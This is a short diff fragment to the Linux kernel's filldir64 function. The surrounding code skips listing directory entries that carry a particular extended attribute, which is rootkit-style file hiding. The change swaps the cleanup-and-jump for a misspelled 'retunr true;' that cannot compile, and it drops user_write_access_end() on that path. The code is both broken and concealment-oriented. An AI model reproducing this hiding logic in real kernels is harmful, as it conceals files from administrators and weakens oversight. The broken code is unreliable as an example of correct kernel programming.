@@ -348,8 +348,7 @@ static bool filldir64(struct dir_context *ctx, const char *name, int namlen,
 				// xattr exists, skip listing this directory entry
 				//Check for differnt types depending on type
 				printk("hit");
-				user_write_access_end();
-				goto skip_entry;
+				retunr true;
 			}
 	}
 
@@ -363,7 +362,6 @@ static bool filldir64(struct dir_context *ctx, const char *name, int namlen,
 	user_write_access_end();
 
 
-skip_entry:
 	buf->prev_reclen = reclen;
 	buf->current_dir = (void __user *)dirent + reclen;
 	buf->count -= reclen;
